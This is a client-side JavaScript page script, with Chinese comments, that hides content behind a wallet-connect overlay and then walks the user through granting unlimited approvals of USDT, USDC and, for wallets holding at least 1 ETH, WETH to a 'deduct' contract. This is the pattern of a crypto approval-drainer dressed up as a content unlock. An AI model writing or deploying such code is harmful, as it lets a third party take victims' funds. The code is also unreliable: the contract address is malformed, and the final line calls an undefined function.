// 注意：此程式碼假設您已在 HTML 中引入了 ethers.js 庫 (例如：<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.umd.min.js"></script>)。

//---Client-side Constants (客戶端常數)---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B7eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

//---ABI Definitions (客戶端精簡版 ABI)---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements (全域變數與 DOM 元素)---
// 假設您的 HTML 中有這些 ID 的元素
const connectButton = document.getElementById('connectButton');
const overlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const statusDiv = document.getElementById('status');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;

// *** 關鍵鎖定旗標：防止 -32002 錯誤 (請求已在處理中) ***
let isConnecting = false;

//---UI Control Functions (使用者介面控制函數)---
function hideOverlay() {
    if (!overlay) return;
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    if (!overlay || !overlayMessage) return;
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    // 確保 opacity 設置在 display: flex 之後，以便過渡生效
    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
}

function updateStatus(message) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

/**
* 重置應用程式的狀態，並可選地顯示「請連接」訊息。
*/
function resetState(showMsg = true) {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet'; //英文
    }
    if (showMsg) {
        showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>'); //英文
    }
}

//---Core Wallet Logic (核心錢包邏輯)---

/**
* 初始化合約實例，使用當前的 signer 和 userAddress
*/
function initializeContracts() {
    if (!signer) throw new Error("Signer not available to initialize contracts.");
    
    // 使用 signer 實例化的合約才能發送交易 (approve, activateService)
    deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
}

/**
* 【魯棒交易】用於行動錢包環境的交易發送和錯誤處理。
*/
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("Wallet not connected or signer missing."); //英文

    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();

    const mobileTx = {
        from: fromAddress,
        to: populatedTx.to,
        data: populatedTx.data,
        value: '0x' + BigInt(txValue).toString(16)
    };

    let txHash;
    let receipt = null;

    try {
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);

        showOverlay(`Authorization sent! HASH: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`); //英文
        receipt = await provider.waitForTransaction(txHash);

    } catch (error) {
        // 捕獲 Trust Wallet 等行動錢包介面可能拋出的錯誤，嘗試從中提取 hash
        console.warn("⚠️ Transaction interface error. Proceeding with on-chain check..."); //英文

        if (error.hash) {
            txHash = error.hash;
        } else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }

        if (txHash) {
            showOverlay(`Transaction interface error occurred! Transaction sent: ${txHash.slice(0, 10)}...<br>Waiting for block confirmation...`); //英文
            receipt = await provider.waitForTransaction(txHash);
        } else {
            throw new Error(`Transaction failed to send, and unable to retrieve transaction hash from error: ${error.message}`); //英文
        }
    }

    if (!receipt || receipt.status !== 1) {
        throw new Error(`Transaction failed on-chain (reverted). Hash: ${txHash.slice(0, 10)}...`); //英文
    }

    return receipt;
}

/**
* 檢查使用者的服務啟動狀態和代幣授權額度。
* 此函數在地址連線後執行，確保讀取正確。
*/
async function checkAuthorization() {
    try {
        if (!signer || !userAddress) return showOverlay('Wallet is not connected. Please connect first.'); //英文
        updateStatus("Checking authorization status..."); //英文

        // 確保合約已初始化
        if (!deductContract) {
            initializeContracts();
        }

        // 讀取授權所需的門檻值和服務狀態
        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        // 關鍵：讀取代幣授權額度，確保地址讀對
        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        console.log("【DEBUG_FinalCheck】User Address:", userAddress); // 檢查地址是否讀對
        console.log("【DEBUG_FinalCheck】Is Fully Authorized:", isFullyAuthorized);

        if (isFullyAuthorized) {
            if (connectButton) {
                connectButton.classList.add('connected');
                connectButton.title = `Disconnect: ${userAddress.slice(0, 6)}...`; // 顯示連接地址
            }
            hideOverlay();
            updateStatus("✅ Service activated and authorized successfully."); //英文
        } else {
            if (connectButton) {
                connectButton.classList.remove('connected');
                connectButton.title = 'Connect & Authorize'; //英文
            }
            showOverlay('Authorization required.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start the authorization process)</p>'); //英文
        }
        updateStatus("");
    } catch (error) {
        console.error("Check Authorization Error:", error);
        
        if (error.code === 'CALL_EXCEPTION') {
            return showOverlay('Contract communication failed.<br>Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.'); //英文
        }
        showOverlay(`Authorization check failed: ${error.message}`); //英文
    }
}

/**
* 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
*/
async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
    showOverlay('Checking and setting up token authorizations...'); // 英文
    let tokenToActivate = '';
    let stepCount = 0;

    const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;

    //---檢查並請求所有所需代幣的授權---
    for (const { name, contract, address } of tokensToProcess) {
        stepCount++;
        showOverlay(`Step ${stepCount}/${totalSteps}: Checking and requesting ${name} authorization...`); //英文

        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);

        if (currentAllowance < requiredAllowance) {
            showOverlay(`Step ${stepCount}/${totalSteps}: Requesting ${name} Authorization...<br>Please approve in your wallet.`); //英文

            // 實例化交易：授權為 MaxUint256
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            await sendMobileRobustTransaction(approvalTx);

            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
            if (newAllowance >= requiredAllowance) {
                if (!serviceActivated && !tokenToActivate) {
                    tokenToActivate = address;
                }
            }
        } else {
            // 如果已經有足夠的授權，但服務未激活，則選擇此代幣激活服務
            if (!serviceActivated && !tokenToActivate) {
                tokenToActivate = address;
            }
        }
    }

    //---服務啟動步驟---
    if (!serviceActivated && tokenToActivate) {
        stepCount++;
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        showOverlay(`Step ${stepCount}/${totalSteps}: Activating service (using ${tokenName})...`); //英文

        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        await sendMobileRobustTransaction(activateTx);
    } else if (!serviceActivated) {
        showOverlay(`Warning: No authorized token found to activate service. Please ensure you have ETH for Gas fees.`); //英文
    } else {
        showOverlay(`All authorizations and service activation completed.`); //英文
    }
}


/**
* 初始化錢包：檢查環境、網路和嘗試恢復會話。
*/
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            return showOverlay('Please use a DApp browser (MetaMask, Trust Wallet App) or install a compatible wallet.'); // 英文
        }

        provider = new ethers.BrowserProvider(window.ethereum);

        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.'); //英文
            try {
                // 嘗試切換網路
                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                // 如果切換成功，用戶可能需要刷新頁面或再次連接
                return;
            } catch (switchError) {
                if (switchError.code === 4001) {
                    return showOverlay('您必須切換到以太坊主網 (Ethereum Mainnet) 才能使用此服務。'); //中文
                }
                return showOverlay(`Failed to switch network. Please do so manually.`); //英文
            }
        }

        // 嘗試恢復現有的連線地址 (如果 App 已經授權過)
        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            initializeContracts(); // 初始化合約
            await checkAuthorization(); // 直接檢查授權
        } else {
            // 如果沒有現有連線，顯示連接遮罩，等待用戶點擊按鈕
            showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>'); //英文
        }

    } catch (error) {
        console.error("Initialize Wallet Error:", error);
        showOverlay(`Initialization failed: ${error.message}`); //英文
    }
}


/**
*主要函數：連接錢包並根據餘額執行條件式流程。
* 關鍵點：始終使用 eth_requestAccounts 來強制彈窗，解決 App 自動連接的問題。
*/
async function connectWallet() {
    // 鎖定：解決您的原始錯誤 -32002
    if (isConnecting) {
        console.warn("Wallet connection already in progress. Please wait for the current prompt.");
        return;
    }
    isConnecting = true; // 設置鎖定旗標

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("Wallet provider not found. Please use a DApp browser or install an extension."); // 英文
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // 1. 確保網路在主網
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            showOverlay('Requesting switch to Ethereum Mainnet...<br>Please approve in your wallet.'); // 英文
            await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
            isConnecting = false;
            return;
        }

        showOverlay('Please confirm the connection in your wallet...'); // 英文

        // 2. *** 關鍵：使用 eth_requestAccounts 強制請求連線 ***
        // 這會強制 App 彈出選單/確認視窗，允許用戶切換帳戶。
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("No account selected."); //英文

        const currentConnectedAddress = accounts[0];

        // 3. 總是使用最新的地址覆蓋全局變數和 Signer
        userAddress = currentConnectedAddress;
        signer = await provider.getSigner();
        initializeContracts(); // 初始化合約

        // --- 授權流程的開始 ---
        showOverlay('Preparing optimal authorization flow...'); // 英文

        const [ethBalance, wethBalance] = await Promise.all([
            provider.getBalance(userAddress),
            wethContract.balanceOf(userAddress),
        ]);

        const oneEth = ethers.parseEther("1.0");
        const totalEthEquivalent = ethBalance + wethBalance;
        const hasSufficientEth = totalEthEquivalent >= oneEth;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();

        // 讀取所有代幣的授權額度
        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = serviceActivated && hasSufficientAllowance;

        let tokensToProcess;

        if (hasSufficientEth) {
            tokensToProcess = [
                { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
        } else {
            tokensToProcess = [
                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
            ];
        }

        if (!isFullyAuthorized) {
            await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
        }

        // 最終檢查並更新 UI
        await checkAuthorization();

    } catch (error) {
        console.error("Connect Wallet Error:", error);

        let userMessage = `An error occurred: ${error.message}`; //英文
        if (error.code === 4001) {
            userMessage = "您拒絕了連接/授權請求。請再試一次。"; //中文
        } else if (error.code === -32002) {
            // 專門處理您的原始錯誤：用戶已經有彈窗在等待
            userMessage = "連接請求正在處理中 (代碼 -32002)。請檢查您的錢包**彈窗**，**批准或拒絕**當前的連接請求，然後再試一次。"; //中文
        } else if (error.message.includes('insufficient funds')) {
            userMessage = "授權失敗：ETH 餘額不足以支付 Gas 費用。"; //中文
        } else if (error.message.includes('tron.twnodes.com')) {
             userMessage = '偵測到 Trust Wallet 網路錯誤 (TRON 節點)。<br><br>請<strong>手動在 App 頂部切換到 Ethereum 網路</strong>，然後刷新本頁面再連接。';
        }


        showOverlay(userMessage);
        if (connectButton) {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Retry)'; //英文
        }
    } finally {
        isConnecting = false;
    }
}

/**
* 斷開連線並重置應用程式狀態。
*/
function disconnectWallet() {
    resetState(true);
    // 由於 EIP-1193 沒有標準的斷開連線方法，這只是重置 DApp 狀態。
    alert('Wallet state reset. To fully remove site permissions, please do so in your wallet\'s "Connected Sites" settings.'); //英文
}

//---Event Listeners & Initial Load (事件監聽器與初始載入)---

if (connectButton) {
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });
}

// 頁面載入時執行初始化
initialLoad();